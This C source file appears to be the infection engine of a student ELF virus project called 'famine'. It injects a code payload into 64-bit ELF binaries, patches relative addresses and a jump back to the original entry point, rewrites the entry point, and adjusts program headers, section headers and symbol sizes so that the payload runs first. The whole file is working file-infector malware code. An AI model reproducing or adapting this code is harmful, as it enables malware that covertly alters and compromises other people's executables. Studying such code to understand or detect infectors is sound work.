#include "../include/famine.h"

int find_offset_nentry_oentry(size_t oep, size_t nep) {
    int offset = 0xFFFFFFFF;
    int diff;

    diff = oep < nep ? (int)(nep - oep) : (int)(oep - nep);
    offset = offset - diff;
    return (offset + 1);
}

void    cpy_mem_little(unsigned char *code, int offset) {
    code[0] = offset >> 0;
    code[1] = offset >> 8;
    code[2] = offset >> 16;
    code[3] = offset >> 24;
}

void    change_entry_point(unsigned char *buf, size_t new_entry_point) {
    buf[0x1f] = new_entry_point >> 56;
    buf[0x1e] = new_entry_point >> 48;
    buf[0x1d] = new_entry_point >> 40;
    buf[0x1c] = new_entry_point >> 32;
    buf[0x1b] = new_entry_point >> 24;
    buf[0x1a] = new_entry_point >> 16;
    buf[0x19] = new_entry_point >> 8;
    buf[0x18] = new_entry_point;
}

void change_rel_values(struct code code, struct ELFheaders64 elfHeader) {
    // unsigned char set_rcx[] = {0xb9, 0x34, 0x12, 0x00, 0x00};
    unsigned char set_rdi[] = {0x48, 0x8d, 0x3d};
    unsigned char set_rsi[] = {0x48, 0x8d, 0x35};
    size_t opcode_position;
    size_t offset_rdi_symbol;
    size_t offset_rsi_symbol;
    int offset;

    offset = find_offset_nentry_oentry(elfHeader.e_entry, code.offset_injection + code.strings_size + code.code_size);
    cpy_mem_little(&(code.code[code.code_size - 4]), offset);
    // opcode_position = find_opcode(code.code, code.code_size, set_rcx, sizeof(set_rcx), 0);
    // cpy_mem_little(&(code.code[opcode_position + 1]),(int)code.strings_size);

    opcode_position = find_opcode(code.code, code.code_size, set_rdi, sizeof(set_rdi), 0) + sizeof(set_rdi);
    offset_rdi_symbol = -(opcode_position + code.strings_size + sizeof(set_rdi) + 1);
    cpy_mem_little(&(code.code[opcode_position]),(int)offset_rdi_symbol);
    opcode_position = find_opcode(code.code, code.code_size, set_rsi, sizeof(set_rsi), 0) + sizeof(set_rsi);
    offset_rsi_symbol = -(opcode_position + code.strings_size + sizeof(set_rsi) + 1);
    cpy_mem_little(&(code.code[opcode_position]),(int)offset_rsi_symbol);
}

unsigned char *get_new_buff(struct code *code, unsigned char *buf, struct ELFheaders64 elfHeader, size_t file_size) {
    unsigned char *final = NULL;
    unsigned char str[] = {0x2E, 0x2E, 0x2E, 0x57, 0x4F, 0x4F, 0x44, 0x59, 0x2E, 0x2E, 0x2E, 0x0A};


    change_rel_values(*code , elfHeader);
    memncat(code->code, code->code_size, str, 13);
    code->code_size += 13;

    final = malloc(file_size + 120);
    if (!final)
        return (NULL);
    memncat(final, 0, buf, code->offset_injection);
    memncat(final, code->offset_injection, code->strings, code->strings_size);
    memncat(final, code->offset_injection + code->strings_size, code->code, code->code_size);
    memncat(final, code->offset_injection + code->strings_size + code->code_size, &(buf[code->offset_injection + code->code_size + code->strings_size]), file_size - code->offset_injection - code->code_size -code->strings_size);
    change_entry_point(final, code->offset_injection + code->strings_size);
    return (final);
}


unsigned char *change_buffer(struct code *code, unsigned char *buf, struct ELFheaders64 elfHeader, size_t file_size) {
    struct pheaders64 *pheaders;
    struct sheaders64 *sheaders;
    char *sym_name;

    pheaders = get_program_headers_64(buf, elfHeader);
    buf = get_new_buff(code, buf, elfHeader, file_size);
    elfHeader = get_elfHeader64_little_endian(buf);
    change_program_header(code->strings_size + code->code_size, buf, pheaders, elfHeader);

    change_sections_header_offset(code->strings_size + code->code_size, code->offset_injection, buf, elfHeader);
    sheaders = get_section_headers_64(buf, elfHeader);
    sym_name = get_sym_name_from_offset(buf, code->offset_injection, sheaders, elfHeader);
    if (sym_name) {
        change_symbole_size(code->offset_injection, code->strings_size + code->code_size, sym_name, buf);
        free(sym_name);
    }
    free(sheaders);
    free(pheaders);
    return (buf);
}